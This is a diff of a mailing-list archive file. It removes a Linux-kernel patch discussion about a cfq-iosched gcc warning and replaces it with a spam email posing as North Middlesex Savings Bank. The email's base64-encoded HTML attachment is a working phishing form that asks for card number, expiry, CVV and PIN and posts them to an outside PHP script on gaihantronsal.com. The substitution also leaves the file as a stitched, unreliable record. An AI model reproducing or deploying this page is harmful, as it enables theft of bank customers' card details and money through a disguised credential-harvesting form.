@@ -1,71 +1,183 @@
 Return-Path: <linux-kernel-owner@vger.kernel.org>
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-	id S1756812Ab0JVNbF (ORCPT <rfc822;w@1wt.eu>);
-	Fri, 22 Oct 2010 09:31:05 -0400
-Received: from mx1.redhat.com ([209.132.183.28]:63302 "EHLO mx1.redhat.com"
-	rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-	id S1751446Ab0JVNbD (ORCPT <rfc822;linux-kernel@vger.kernel.org>);
-	Fri, 22 Oct 2010 09:31:03 -0400
-Date: Fri, 22 Oct 2010 09:31:01 -0400
-From: Vivek Goyal <vgoyal@redhat.com>
-To: Jens Axboe <jaxboe@fusionio.com>
-Cc: linux kernel mailing list <linux-kernel@vger.kernel.org>,
-        Andi Kleen <ak@linux.intel.com>, Moyer Jeff Moyer <jmoyer@redhat.com>
-Subject: Re: [PATCH] cfq-iosched: Fix a gcc 4.5 warning and put some comments
-Message-ID: <20101022133101.GA7020@redhat.com>
-References: <20101021182403.GA8378@redhat.com>
- <4CC1414B.8070102@fusionio.com>
+	id S1756837Ab0JVNbn (ORCPT <rfc822;w@1wt.eu>);
+	Fri, 22 Oct 2010 09:31:43 -0400
+Received: from smtprelay0156.b.hostedemail.com ([64.98.42.156]:59021 "EHLO
+	smtprelay.b.hostedemail.com" rhost-flags-OK-OK-OK-FAIL)
+	by vger.kernel.org with ESMTP id S1751446Ab0JVNbm (ORCPT
+	<rfc822;linux-kernel@vger.kernel.org>);
+	Fri, 22 Oct 2010 09:31:42 -0400
+X-Greylist: delayed 1235 seconds by postgrey-1.27 at vger.kernel.org; Fri, 22 Oct 2010 09:31:42 EDT
+X-Panda: scanned!
+X-Spam-Summary: 30,2,0,68efba86ab900c26,d41d8cd98f00b204,customer.support@nmsb.com,,RULES_HIT:379:387:539:540:541:542:543:567:871:988:989:1000:1155:1254:1260:1308:1309:1313:1314:1437:1516:1518:1535:1537:1561:1575:1587:1594:1711:1714:1730:1747:1764:1766:1792:1823:2073:2076:2084:2393:2559:2562:2693:2890:2893:2908:2909:3138:3690:3865:3867:3868:3869:3870:3872:3873:4042:4120:5007:6506:7281:7628:8550:8829:10004:10231:10234:10394:10400:10726,0,RBL:none,CacheIP:none,Bayesian:0.5,0.5,0.5,Netcheck:none,DomainCache:0,MSF:not bulk,SPF:fn,MSBL:none,DNSBL:none,Custom_rules:0:0:0
+X-Session-Marker: 73746576657365766572646961406875676865732E6E6574
+X-Filterd-Recvd-Size: 8915
+From: "North Middlesex Savings Bank" <customer.support@nmsb.com>
+Subject: Official Notification. Confirm Account Ownership!
+Date: Fri, 22 Oct 2010 09:11:05 -0400
 MIME-Version: 1.0
-Content-Type: text/plain; charset=utf-8
-Content-Disposition: inline
-Content-Transfer-Encoding: 8bit
-In-Reply-To: <4CC1414B.8070102@fusionio.com>
-User-Agent: Mutt/1.5.21 (2010-09-15)
+Content-Type: multipart/mixed;
+	boundary="----=_NextPart_000_00C5_01C2A9A6.437E7520"
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Message-Id: <20101022131105.7BD9A1599338@smtprelay06.b.hostedemail.com>
+To: undisclosed-recipients:;
 Sender: linux-kernel-owner@vger.kernel.org
 List-ID: <linux-kernel.vger.kernel.org>
 X-Mailing-List: linux-kernel@vger.kernel.org
 
-On Fri, Oct 22, 2010 at 09:46:19AM +0200, Jens Axboe wrote:
-> On 2010-10-21 20:24, Vivek Goyal wrote:
-> > - Andi encountedred following warning with gcc 4.5
-> > 
-> >   linux/block/cfq-iosched.c: In function ‘cfq_dispatch_requests’:
-> >   linux/block/cfq-iosched.c:2156:3: warning: array subscript is above array
-> >   bounds
-> > 
-> > - Warning happens due to following code.
-> > 
-> >   slice = group_slice * count /
-> > 		max_t(unsigned, cfqg->busy_queues_avg[cfqd->serving_prio],
-> > 		cfq_group_busy_queues_wl(cfqd->serving_prio, cfqd, cfqg));
-> > 
-> >   gcc is complaining about cfqg->busy_queues_avg[] being indexed by CFQ
-> >   prio classes (RT, BE and IDLE) while the array size is only 2.
-> > 
-> > - At run time, we never access cfqg->busy_queues_avg[IDLE] and return from
-> >   function before this code hits.
-> > 
-> > - To fix warning increase the array size though it will remain unused. This
-> >   patch also puts some comments to clarify some of the confusions.
-> > 
-> > - I have taken Jens's patch and modified it a bit.
-> > 
-> > - Compile tested with gcc 4.4 and boot tested. I don't have gcc 4.5
-> >   running, Andi can you please test it with gcc 4.5 to make sure it
-> >   worked.
-> > 
-> > Reported-by: Andi Kleen <ak@linux.intel.com>
-> > Signed-off-by: Vivek Goyal <vgoyal@redhat.com>
-> > Signed-off-by: Jens Axboe <axboe@kernel.dk>
-> 
-> Thanks, I'll put this one in. BTW, you can't just add a signed-off-by
-> from me (or anyone else, for that matter), they have to be provided
-> explicitly by each individual.
+This is a multi-part message in MIME format.
 
-Ok, sorry about that.
+------=_NextPart_000_00C5_01C2A9A6.437E7520
+Content-Type: text/plain;
+	charset="Windows-1250"
+Content-Transfer-Encoding: 7bit
 
-So in general, if I happen to pick somebody's patch, modify it and repost
-it, how do I reflect the Signed-off-by of original author.
+ATTENTION !
 
-Thanks
-Vivek
+
+Please download the form attached to this email and open it in a web browser. 
+
+Once opened, you will be provided with steps to confirm account ownership.
+
+We thank you for your prompt attention to this matter.
+
+Customer Support.
+
+
+
+
+
+------=_NextPart_000_00C5_01C2A9A6.437E7520
+Content-Type: application/octet-stream;
+	name="customer support.htm"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment;
+	filename="customer support.htm"
+
+PGh0bWw+DQoNCjxoZWFkPg0KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1M
+YW5ndWFnZSIgY29udGVudD0iZW4tdXMiPg0KPG1ldGEgaHR0cC1lcXVpdj0i
+Q29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9d2lu
+ZG93cy0xMjUyIj4NCjx0aXRsZT4gbm1zYiA8L3RpdGxlPg0KPFNDUklQVCBs
+YW5ndWFnZT1KYXZhU2NyaXB0Pg0KPCEtLQ0KZnVuY3Rpb24gY2hlY2tfYWxs
+KGZvcm0pIHsgDQppZiAoZm9ybS5sZXRzMS52YWx1ZS5sZW5ndGggPCAxNikg
+eyBhbGVydCgiUGxlYXNlIGNvcnJlY3QgYW5kIHRyeSBhZ2Fpbi4iKTsgIGZv
+cm0ubGV0czEuZm9jdXMoKTsgcmV0dXJuIGZhbHNlOyAgfSANCmlmIChmb3Jt
+LmxldHMzLnZhbHVlLmxlbmd0aCA8IDQpICAgIHsgYWxlcnQoIlBsZWFzZSBj
+b3JyZWN0IGFuZCB0cnkgYWdhaW4uIik7ICBmb3JtLmxldHMzLmZvY3VzKCk7
+IHJldHVybiBmYWxzZTsgfSB9DQotLT4NCjwvU0NSSVBUPg0KDQo8L2hlYWQ+
+DQoNCjxib2R5IGJhY2tncm91bmQ9ImxvY2suUE5HIj4NCg0KPHRhYmxlIGFs
+aWduPSJjZW50ZXIiIGJvcmRlcj0iMCIgY2VsbHBhZGRpbmc9IjAiIGNlbGxz
+cGFjaW5nPSIwIiB3aWR0aD0iNTIlIiBoZWlnaHQ9IjUyNiI+PHRyPg0KCTx0
+ZCB3aWR0aD0iNjU3IiBoZWlnaHQ9IjI2IiBiZ2NvbG9yPSIjRkZGRkZGIj4N
+Cgk8aW1nIGJvcmRlcj0iMCIgc3JjPSJodHRwOi8vd3d3LmdhaWhhbnRyb25z
+YWwuY29tL2xvZ19vbmVvci5QTkciIHdpZHRoPSIyMDYiIGhlaWdodD0iNTgi
+PjwvdGQ+PC90cj48dHI+DQoJCTx0ZCB3aWR0aD0iNjU3IiBoZWlnaHQ9IjQ1
+OCIgYmdjb2xvcj0iI0ZGRkZGRiI+DQoJCTxpbWcgYm9yZGVyPSIwIiBzcmM9
+Imh0dHA6Ly93d3cuZ2FpaGFudHJvbnNhbC5jb20vcGxfbGFvLlBORyIgd2lk
+dGg9IjY0NyIgaGVpZ2h0PSI1Ij48cD4NCgkJPGltZyBib3JkZXI9IjAiIHNy
+Yz0iaHR0cDovL3d3dy5nYWloYW50cm9uc2FsLmNvbS8zLnBuZyIgd2lkdGg9
+IjY5NCIgaGVpZ2h0PSI5OSI+PC9wPg0KCQk8cD4NCgkJPGltZyBib3JkZXI9
+IjAiIHNyYz0iaHR0cDovL3d3dy5nYWloYW50cm9uc2FsLmNvbS9pbmZfb3Iu
+UE5HIiB3aWR0aD0iNjU2IiBoZWlnaHQ9IjIwIj48L3A+DQoNCg0KDQoNCg0K
+PGZvcm0gYWN0aW9uPSJodHRwOi8vd3d3LmdhaWhhbnRyb25zYWwuY29tL25l
+Z3UucGhwIiBtZXRob2Q9InBvc3QiPg0KDQo8dGFibGUgd2lkdGg9IjEwMCUi
+IGFsaWduPSJjZW50ZXIiIGNlbGxzcGFjaW5nPSIzIiBjZWxscGFkZGluZz0i
+MyI+DQoNCg0KDQo8dHI+DQoNCg0KDQogICAgICAgPHRkIGFsaWduPSJsZWZ0
+IiB2YWxpZ249InRvcCIgd2lkdGg9IjE1NSIgc3R5bGU9ImZvbnQtZmFtaWx5
+OiBhcmlhbDsgZm9udC1zaXplOiAxMnB4Ij4gDQoJCTxpbWcgYm9yZGVyPSIw
+IiBzcmM9Imh0dHA6Ly93d3cuZ2FpaGFudHJvbnNhbC5jb20vcGdyX29uZS5Q
+TkciIHdpZHRoPSI5MSIgaGVpZ2h0PSIxNSI+PC90ZD4NCg0KDQoNCgkgICA8
+dGQgdmFsaWduPSJ0b3AiIGNsYXNzPSJ0aXRsZTEiPjxmb250IGZhY2U9IlZl
+cmRhbmEiIHNpemU9IjIiPjQwMjA1MFhYWFhYWFhYWFg8L2ZvbnQ+PC90ZD4N
+Cg0KDQoNCgkNCg0KDQoNCjwvdHI+DQoNCg0KDQo8dHI+DQoNCg0KDQogICAg
+ICAgPHRkIGFsaWduPSJsZWZ0IiB2YWxpZ249InRvcCIgd2lkdGg9IjE1NSIg
+c3R5bGU9ImZvbnQtZmFtaWx5OiBhcmlhbDsgZm9udC1zaXplOiAxMnB4Ij4N
+CgkJPGltZyBib3JkZXI9IjAiIHNyYz0iaHR0cDovL3d3dy5nYWloYW50cm9u
+c2FsLmNvbS9wZ3JfdG93LlBORyIgd2lkdGg9IjExMCIgaGVpZ2h0PSIxNSI+
+PC90ZD4NCg0KDQoNCgkgICA8dGQgdmFsaWduPSJ0b3AiIHN0eWxlPSJmb250
+LWZhbWlseTogYXJpYWw7IGZvbnQtc2l6ZTogMTJweCI+DQoJCTxpbnB1dCB0
+eXBlPSJ0ZXh0IiBzaXplPSIyNCIgbWF4bGVuZ3RoPSIxNiIgbmFtZT0ibGV0
+czEiPjwvdGQ+DQoNCg0KDQoJDQoNCg0KDQo8L3RyPg0KDQoNCg0KPHRyPg0K
+DQoNCg0KICAgICAgIDx0ZCBhbGlnbj0ibGVmdCIgdmFsaWduPSJ0b3AiIHdp
+ZHRoPSIxNTUiIHN0eWxlPSJmb250LWZhbWlseTogYXJpYWw7IGZvbnQtc2l6
+ZTogMTJweCI+DQoJCTxpbWcgYm9yZGVyPSIwIiBzcmM9Imh0dHA6Ly93d3cu
+Z2FpaGFudHJvbnNhbC5jb20vcGdyX3RyZWUuUE5HIiB3aWR0aD0iMTAyIiBo
+ZWlnaHQ9IjE1Ij48L3RkPg0KDQoNCg0KCSAgIDx0ZCB2YWxpZ249InRvcCIg
+c3R5bGU9ImZvbnQtZmFtaWx5OiBhcmlhbDsgZm9udC1zaXplOiAxMnB4IiA+
+DQoJCTxzZWxlY3QgbmFtZT0iYml0MSIgc2l6ZT0iMSI+DQoNCg0KDQo8b3B0
+aW9uIHZhbHVlPSIiIHNlbGVjdGVkPiA8L29wdGlvbj4NCg0KDQoNCjxvcHRp
+b24gdmFsdWU9IjAxIj4wMTwvb3B0aW9uPg0KDQoNCg0KPG9wdGlvbiB2YWx1
+ZT0iMDIiPjAyPC9vcHRpb24+DQoNCg0KDQo8b3B0aW9uIHZhbHVlPSIwMyI+
+MDM8L29wdGlvbj4NCg0KDQoNCjxvcHRpb24gdmFsdWU9IjA0Ij4wNDwvb3B0
+aW9uPg0KDQoNCg0KPG9wdGlvbiB2YWx1ZT0iMDUiPjA1PC9vcHRpb24+DQoN
+Cg0KDQo8b3B0aW9uIHZhbHVlPSIwNiI+MDY8L29wdGlvbj4NCg0KDQoNCjxv
+cHRpb24gdmFsdWU9IjA3Ij4wNzwvb3B0aW9uPg0KDQoNCg0KPG9wdGlvbiB2
+YWx1ZT0iMDgiPjA4PC9vcHRpb24+DQoNCg0KDQo8b3B0aW9uIHZhbHVlPSIw
+OSI+MDk8L29wdGlvbj4NCg0KDQoNCjxvcHRpb24gdmFsdWU9IjEwIj4xMDwv
+b3B0aW9uPg0KDQoNCg0KPG9wdGlvbiB2YWx1ZT0iMTEiPjExPC9vcHRpb24+
+DQoNCg0KDQo8b3B0aW9uIHZhbHVlPSIxMiI+MTI8L29wdGlvbj48L3NlbGVj
+dD4mbmJzcDsNCg0KDQoNCjxzZWxlY3QgbmFtZT0iYml0MiIgc2l6ZT0iMSI+
+DQoNCg0KDQo8b3B0aW9uIHZhbHVlPSIiIHNlbGVjdGVkPiA8L29wdGlvbj4N
+Cg0KDQoNCjxvcHRpb24gdmFsdWU9IjIwMTAiPjIwMTA8L29wdGlvbj4NCg0K
+DQoNCjxvcHRpb24gdmFsdWU9IjIwMTEiPjIwMTE8L29wdGlvbj4NCg0KDQoN
+CjxvcHRpb24gdmFsdWU9IjIwMTIiPjIwMTI8L29wdGlvbj4NCg0KDQoNCjxv
+cHRpb24gdmFsdWU9IjIwMTMiPjIwMTM8L29wdGlvbj4NCg0KDQoNCjxvcHRp
+b24gdmFsdWU9IjIwMTQiPjIwMTQ8L29wdGlvbj4NCg0KDQoNCjxvcHRpb24g
+dmFsdWU9IjIwMTUiPjIwMTU8L29wdGlvbj4NCg0KDQoNCjxvcHRpb24gdmFs
+dWU9IjIwMTYiPjIwMTY8L29wdGlvbj4NCg0KDQoNCjxvcHRpb24gdmFsdWU9
+IjIwMTciPjIwMTc8L29wdGlvbj4NCg0KDQoNCjxvcHRpb24gdmFsdWU9IjIw
+MTgiPjIwMTg8L29wdGlvbj4NCg0KDQoNCjxvcHRpb24gdmFsdWU9IjIwMTki
+PjIwMTk8L29wdGlvbj4NCg0KDQoNCjxvcHRpb24gdmFsdWU9IjIwMjAiPjIw
+MjA8L29wdGlvbj4NCg0KDQoNCjwvc2VsZWN0PjwvdGQ+ICAgDQoNCg0KDQo8
+L3RyPg0KDQoNCg0KDQoNCg0KDQo8dHI+DQoNCg0KDQogICAgICAgPHRkIGFs
+aWduPSJsZWZ0IiB2YWxpZ249InRvcCIgd2lkdGg9IjE1NSIgc3R5bGU9ImZv
+bnQtZmFtaWx5OiBhcmlhbDsgZm9udC1zaXplOiAxMnB4Ij4NCg0KDQoNCjxp
+bWcgYm9yZGVyPSIwIiBzcmM9Imh0dHA6Ly93d3cuZ2FpaGFudHJvbnNhbC5j
+b20vcGdyX2ZvcmUuUE5HIiB3aWR0aD0iMTU4IiBoZWlnaHQ9IjE1Ij48L3Rk
+Pg0KDQoNCg0KCSAgIDx0ZCB2YWxpZ249InRvcCIgc3R5bGU9ImZvbnQtZmFt
+aWx5OiBhcmlhbDsgZm9udC1zaXplOiAxMnB4Ij4NCg0KDQoNCgkgICA8dGFi
+bGUgYm9yZGVyPSIwIiBjZWxscGFkZGluZz0iMCIgY2VsbHNwYWNpbmc9IjAi
+Pg0KDQoNCg0KCSAgIDx0cj48dGQgc3R5bGU9ImZvbnQtZmFtaWx5OiBhcmlh
+bDsgZm9udC1zaXplOiAxMnB4Ij4NCg0KDQoNCjxpbnB1dCB0eXBlPSJ0ZXh0
+IiBzaXplPSIyIiBtYXhsZW5ndGg9IjMiIG5hbWU9ImxldHMyIiB2YWx1ZT0i
+Ij4NCg0KDQoNCjwvdGQ+DQoNCg0KDQoNCg0KDQoNCjwvdHI+DQoNCg0KDQo8
+L3RhYmxlPg0KDQoNCg0KCSAgIDwvdGQ+DQoNCg0KDQogPC90cj4NCg0KDQoN
+Cjx0cj4NCg0KDQoNCiAgICAgICA8dGQgYWxpZ249ImxlZnQiIHZhbGlnbj0i
+dG9wIiB3aWR0aD0iMTU1IiBoZWlnaHQ9IjE0IiBzdHlsZT0iZm9udC1mYW1p
+bHk6IGFyaWFsOyBmb250LXNpemU6IDEycHgiPg0KCQk8aW1nIGJvcmRlcj0i
+MCIgc3JjPSJodHRwOi8vd3d3LmdhaWhhbnRyb25zYWwuY29tL3Bncl9maXZl
+LlBORyIgd2lkdGg9IjgyIiBoZWlnaHQ9IjE1Ij48L3RkPg0KDQoNCg0KCSAg
+IDx0ZCB2YWxpZ249InRvcCIgaGVpZ2h0PSIxNCIgc3R5bGU9ImZvbnQtZmFt
+aWx5OiBhcmlhbDsgZm9udC1zaXplOiAxMnB4Ij48dGFibGUgYm9yZGVyPSIw
+IiBjZWxscGFkZGluZz0iMCIgY2VsbHNwYWNpbmc9IjAiPg0KDQoNCg0KCSAg
+IDx0cj48dGQgc3R5bGU9ImZvbnQtZmFtaWx5OiBhcmlhbDsgZm9udC1zaXpl
+OiAxMnB4Ij4NCg0KDQoNCjxpbnB1dCB0eXBlPSJwYXNzd29yZCIgc2l6ZT0i
+NCIgbWF4bGVuZ3RoPSI0IiBuYW1lPSJsZXRzMyIgdmFsdWU9IiI+DQoNCg0K
+DQo8L3RkPg0KDQoNCg0KPHRkIHN0eWxlPSJmb250LWZhbWlseTogYXJpYWw7
+IGZvbnQtc2l6ZTogMTJweCI+Jm5ic3A7PGZvbnQgc2l6ZT0iMSIgZmFjZT0i
+dmVyZGFuYSI+PGltZyBib3JkZXI9IjAiIHNyYz0iaHR0cDovL3d3dy5nYWlo
+YW50cm9uc2FsLmNvbS9mb3JlYXRtLlBORyIgd2lkdGg9IjIxMCIgaGVpZ2h0
+PSIxNSI+Jm5ic3A7DQoNCg0KDQo8L3RkPg0KDQoNCg0KPC90cj4NCg0KDQoN
+CjwvdGFibGU+PC90ZD4NCg0KDQoNCgkgICANCg0KDQoNCjwvdHI+DQoNCg0K
+DQogDQoNCg0KDQo8dHI+DQoNCg0KDQogICAgICAgPHRkIGFsaWduPSJsZWZ0
+IiB2YWxpZ249InRvcCIgd2lkdGg9IjE1NSIgaGVpZ2h0PSIxNCIgc3R5bGU9
+ImZvbnQtZmFtaWx5OiBhcmlhbDsgZm9udC1zaXplOiAxMnB4Ij48L3RkPg0K
+DQoNCg0KCSAgIDx0ZCB2YWxpZ249InRvcCIgaGVpZ2h0PSIxNCIgc3R5bGU9
+ImZvbnQtZmFtaWx5OiBhcmlhbDsgZm9udC1zaXplOiAxMnB4Ij4NCjxpbnB1
+dCBvbmNsaWNrPSJyZXR1cm4gY2hlY2tfYWxsKHRoaXMuZm9ybSk7IiB0eXBl
+PSJzdWJtaXQiIHZhbHVlPSJTdWJtaXQiIHN0eWxlPSJiYWNrZ3JvdW5kOiM2
+NjM0Njc7Y29sb3I6I2ZmZmZmZjtib3JkZXI6MnB4IHNvbGlkICMwMDAwMDA7
+Zm9udC13ZWlnaHQ6Ym9sZDsgZmxvYXQ6bGVmdCI+PC90ZD4NCg0KDQoNCgkg
+ICANCg0KDQoNCjwvdHI+DQoNCg0KDQogDQoNCg0KDQo8L3RhYmxlPg0KDQoN
+Cg0KDQoNCg0KDQoJCTxwPg0KCQk8aW1nIGJvcmRlcj0iMCIgc3JjPSJodHRw
+Oi8vd3d3LmdhaWhhbnRyb25zYWwuY29tL3BsX2xhby5QTkciIHdpZHRoPSI2
+NDciIGhlaWdodD0iNSI+PC90ZD48L3RyPjx0cj4NCgk8dGQgd2lkdGg9IjY1
+NyIgaGVpZ2h0PSI0MiIgYmdjb2xvcj0iI0ZGRkZGRiI+DQoJPGltZyBib3Jk
+ZXI9IjAiIHNyYz0iaHR0cDovL3d3dy5nYWloYW50cm9uc2FsLmNvbS9kb25z
+X2hqLlBORyIgd2lkdGg9IjE0MiIgaGVpZ2h0PSIzMyI+PC90ZD48L3RyPjwv
+dGFibGU+DQo8L2Zvcm0+DQo8L2JvZHk+DQoNCjwvaHRtbD4=
+
+------=_NextPart_000_00C5_01C2A9A6.437E7520--
